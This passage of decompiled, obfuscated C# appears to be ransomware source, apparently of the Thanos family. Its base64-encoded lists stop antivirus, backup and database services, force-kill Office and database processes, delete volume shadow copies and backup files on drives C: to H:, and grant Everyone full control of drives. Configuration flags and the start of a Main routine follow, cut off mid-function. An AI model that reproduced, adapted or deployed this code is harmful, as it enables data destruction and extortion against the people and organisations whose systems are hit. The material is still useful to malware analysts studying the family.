		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		bRWwIGxQDNUf("c3RvcCBVSTBEZXRlY3QgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBXM1N2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBNU09MQVAkVFBTIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBBY3JTY2gyU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBBUlNNIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		bRWwIGxQDNUf("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRQUk9EIC95"),
		bRWwIGxQDNUf("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		bRWwIGxQDNUf("c3RvcCBBbnRpdmlydXMgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		bRWwIGxQDNUf("c3RvcCBBVlAgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		bRWwIGxQDNUf("c3RvcCBEQ0FnZW50IC95"),
		bRWwIGxQDNUf("c3RvcCBiZWRiZyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBFaHR0cFNydiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNTVMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		bRWwIGxQDNUf("c3RvcCBla3JuIC95"),
		bRWwIGxQDNUf("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		bRWwIGxQDNUf("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRUUFMgL3k="),
		bRWwIGxQDNUf("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBudHJ0c2NhbiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		bRWwIGxQDNUf("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBFU0hBU1JWIC95"),
		bRWwIGxQDNUf("c3RvcCBTRFJTVkMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		bRWwIGxQDNUf("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		bRWwIGxQDNUf("c3RvcCBLQVZGUyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxXcml0ZXIgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBLQVZGU0dUIC95"),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBrYXZmc3NscCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		bRWwIGxQDNUf("c3RvcCBrbG5hZ2VudCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBtYWNtbnN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		bRWwIGxQDNUf("c3RvcCBtYXN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		bRWwIGxQDNUf("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		bRWwIGxQDNUf("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		bRWwIGxQDNUf("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNeVNRTDU3IC95"),
		bRWwIGxQDNUf("c3RvcCBNY1NoaWVsZCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNeVNRTDgwIC95"),
		bRWwIGxQDNUf("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		bRWwIGxQDNUf("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		bRWwIGxQDNUf("c3RvcCBtZmVmaXJlIC95"),
		bRWwIGxQDNUf("c3RvcCB3YmVuZ2luZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		bRWwIGxQDNUf("c3RvcCBtZmVtbXMgL3k="),
		bRWwIGxQDNUf("c3RvcCB3YmVuZ2luZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBSRVN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBtZmV2dHAgL3k="),
		bRWwIGxQDNUf("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		bRWwIGxQDNUf("c3RvcCBzYWNzdnIgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		bRWwIGxQDNUf("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		bRWwIGxQDNUf("c3RvcCBTQVZTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		bRWwIGxQDNUf("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		bRWwIGxQDNUf("c3RvcCBTaE1vbml0b3IgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		bRWwIGxQDNUf("c3RvcCBTbWNpbnN0IC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		bRWwIGxQDNUf("c3RvcCBTbWNTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		bRWwIGxQDNUf("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		bRWwIGxQDNUf("c3RvcCBzb3Bob3NzcHMgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		bRWwIGxQDNUf("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		bRWwIGxQDNUf("c3RvcCBzd2lfZmlsdGVyIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		bRWwIGxQDNUf("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		bRWwIGxQDNUf("c3RvcCBzd2lfdXBkYXRlIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		bRWwIGxQDNUf("c3RvcCBUbUNDU0YgL3k="),
		bRWwIGxQDNUf("c3RvcCBTUUxCcm93c2VyIC95"),
		bRWwIGxQDNUf("c3RvcCB0bWxpc3RlbiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBUcnVlS2V5IC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		bRWwIGxQDNUf("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		bRWwIGxQDNUf("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		bRWwIGxQDNUf("c3RvcCBXUlNWQyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		bRWwIGxQDNUf("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> TPOryRCaxA = new List<string>
	{
		bRWwIGxQDNUf("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		bRWwIGxQDNUf("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		bRWwIGxQDNUf("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		bRWwIGxQDNUf("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		bRWwIGxQDNUf("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		bRWwIGxQDNUf("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		bRWwIGxQDNUf("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		bRWwIGxQDNUf("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> naZfYSlVLbbD = new List<string>
	{
		bRWwIGxQDNUf("L0lNIG1zcHViLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIG15c3FsZC5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIGFnbnRzdmMuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIHRoZWJhdC5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIGVuY3N2Yy5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIENOVEFvU01nci5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIGRiZW5nNTAuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG9jb21tLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIHpvb2x6LmV4ZSAvRg=="),
		bRWwIGxQDNUf("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIGRic25tcC5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIG1zcHViLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG9uZW5vdGUuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG91dGxvb2suZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHZpc2lvLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIHdpbndvcmQuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHdvcmRwYWQuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIG9jc3NkLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIG9yYWNsZS5leGUgL0Y="),
		bRWwIGxQDNUf("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		bRWwIGxQDNUf("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		bRWwIGxQDNUf("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> RrfarDMdNwPP = new List<string>
	{
		bRWwIGxQDNUf(TCHNzfFRqL("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		bRWwIGxQDNUf("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		bRWwIGxQDNUf(TCHNzfFRqL("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string EdttAPQcdSxW = bRWwIGxQDNUf("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> nSBqCkigxmUihhr = new List<string>
	{
		bRWwIGxQDNUf("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		bRWwIGxQDNUf("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		bRWwIGxQDNUf("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		bRWwIGxQDNUf("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		bRWwIGxQDNUf("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		bRWwIGxQDNUf("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> tvAJhxIRgER = new List<string>
	{
		bRWwIGxQDNUf("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		bRWwIGxQDNUf("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		bRWwIGxQDNUf("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string HMMADwVzfWCLWj = "NO";

	public static string WuzTfsYKJxZc = "NO";

	internal static DateTime DoTaEYarZFYR = new DateTime(2000, 1, 1);

	internal static DateTime AVUDstsECbSty = new DateTime(2100, 1, 1);

	public static string OsMYpRNHCzj = "YES";

	public static string AuoMqBzahHDilI = "10";

	public static string DBvakJPgHNX = "NO";

	public static string WEtvcffYQdao = "NO";

	public static string LRPvlIipaxh = "NO";

	public static string abOJOYaSlUTrZ = "NO";

	public static string MGnbwSWLvZwO = "NO";

	public static string PccLrMHcmQe = "NO";

	public static List<string> DUqqCtAuioSycsG = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string WGgfEjujSrGUZq = "NO";

	public static string LSzalKwxGC = "1";

	public static string mAYNGGhTkpHQ = "NO";

	public static string DsytHgVXDv = "NO";

	public static string DJvDBOjxNREk = "NO";

	public static string xgernjlYkaEXQXz = string.Empty;

	public static string YhhylhXkMjO = "NO";

	public static string MrzZHDXIXBqH = "NO";

	public static string oXeTKfOUxJlWIqgDr = "NO";

	public static string ygGfGtnzFL = "";

	public static string UgdpRiWmFqzNaxeM = "";

	public static string nvyfXyVJQBNZSA = "NO";

	public static string uhqeymwEYTwN = "NO";

	public static string kYgKGUqZJktLA = "NO";

	public static string udURVaMMSrkH = "NO";

	public static string UhfomLaRfkRH = "NO";

	public static string iIJyvOdoIBAVi = "LOGONISOFF";

	public static string nTGDZOgWqp = "NO";

	public static string oCLNbzPcArEWJx = "NO";

	public static string VBnebdmzVyVM = "mystartup.lnk";

	public static string SwwELWOkpNS = "NO";

	public static string oZhKUEcDFqXZ = "NO";

	public static string FFqGwatACRvkJ = "NO";

	public static string SNKAjREyohbYV = "NO";

	public static string BcfodWWANh = "VGhhbm9z";

	public static string koQPJcbSDJAhohVI = "YES";

	public static string JgvdItJImwIn = "NO";

	public static string SfmkfuIRXbWPDvip = "NO";

	public static string SNEskbEXCT = "NO";

	public static string[] MraFIvcUTXn = new string[0];

	public static string spWsYMjzyqV = "NO";

	public static bool ifjARTnvYFXaP = true;

	public static string GbLUAgnhVeksg = "NO";

	public static bool USpxehIBNWBw = false;

	public static bool IPEdelhHNhMeB = false;

	public static bool FsPxHJreLDsskIs = false;

	public static bool oNHBERkFRJGTwfBH = false;

	public static string vsTGVFSJmItByidD = "Debug_Log.txt";

	public static bool nmuAfqaGuDVCWu = false;

	public static bool PbcNetlOLoy = false;

	public static bool MjMqZJIpeu = false;

	public static bool ORfPBuBSaW = false;

	public static bool aWqOuNoAvwwKwt = true;

	public static string KYLZxlMaEu = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + fRNtfJxgwGHJ.jrXTCKQXCBuGd() + ".txt";

	private static void Main(string[] args)
	{
		try
		{
			string RnRdOGcofxD = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == RnRdOGcofxD) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			tOcQOLYuzVmArl.WvINmMpTGSS(hFeLnzPNroORHA);
		}
		catch (Exception)
		{
		}
		try
		{
			if (koQPJcbSDJAhohVI == "YES")
			{
				Thread thread = new Thread(SHyKcfCCIqYEijHd.MuMsJWHNfsAp);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (xcInAHeGkPUKG == "YES")
		{
			Thread.Sleep(int.Parse(MeMSPCLjDGf));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MGnbwSWLvZwO == "YES")
		{
			try
			{
